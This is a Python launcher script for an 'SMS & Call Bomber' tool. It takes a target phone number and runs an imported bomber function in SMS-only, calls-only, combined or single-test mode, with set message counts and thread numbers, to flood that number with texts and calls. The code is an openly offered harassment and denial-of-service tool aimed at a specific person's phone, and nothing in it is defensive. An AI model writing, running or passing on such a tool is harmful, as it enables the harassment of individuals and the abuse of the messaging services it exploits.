#!/usr/bin/env python3

"""
Combined SMS & Call Bomber Demo
Quick demo of the enhanced bombing capabilities.
"""

import asyncio
import sys
import os

# Add the parent directory to sys.path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sms_bomber.core.config import AppConfig
from sms_bomber.main import bomber


def show_usage():
    """Show usage examples."""
    print("📞📱 Combined SMS & Call Bomber")
    print("=" * 40)
    print("Usage examples:")
    print("  python demo_bomber.py 09123456789          # Combined SMS + Calls")
    print("  python demo_bomber.py 09123456789 sms      # SMS only")
    print("  python demo_bomber.py 09123456789 calls    # Calls only")
    print("  python demo_bomber.py 09123456789 test     # Single test round")


async def run_demo(phone_number: str, mode: str = "combined"):
    """Run bombing demo."""
    
    if mode == "sms":
        config = AppConfig(
            target=phone_number,
            count=2,
            threads=8,
            verbose=True,
            sms_only=True,
            calls_only=False
        )
        print("🎯 Running SMS-only bombing...")
        
    elif mode == "calls":
        config = AppConfig(
            target=phone_number,
            count=2,
            threads=5,
            verbose=True,
            sms_only=False,
            calls_only=True
        )
        print("🎯 Running call-only bombing...")
        
    elif mode == "test":
        config = AppConfig(
            target=phone_number,
            count=1,
            threads=5,
            verbose=True,
            sms_only=False,
            calls_only=False
        )
        print("🎯 Running single test round (SMS + Calls)...")
        
    else:  # combined
        config = AppConfig(
            target=phone_number,
            count=3,
            threads=10,
            verbose=True,
            sms_only=False,
            calls_only=False
        )
        print("🎯 Running combined SMS + Call bombing...")
    
    try:
        await bomber(config)
        print("\n✅ Bombing completed successfully!")
        
    except KeyboardInterrupt:
        print("\n🛑 Bombing interrupted by user")
    except Exception as e:
        print(f"\n❌ Error during bombing: {e}")


def main():
    """Main entry point."""
    if len(sys.argv) < 2:
        show_usage()
        return
    
    phone_number = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else "combined"
    
    # Validate phone number
    if not phone_number.startswith('09') or len(phone_number) != 11:
        print("❌ Invalid phone number format. Use: 09xxxxxxxxx")
        return
    
    print(f"Target: {phone_number}")
    print(f"Mode: {mode}")
    print("-" * 40)
    
    try:
        asyncio.run(run_demo(phone_number, mode))
    except KeyboardInterrupt:
        print("\n🛑 Demo cancelled")


if __name__ == "__main__":
    main()
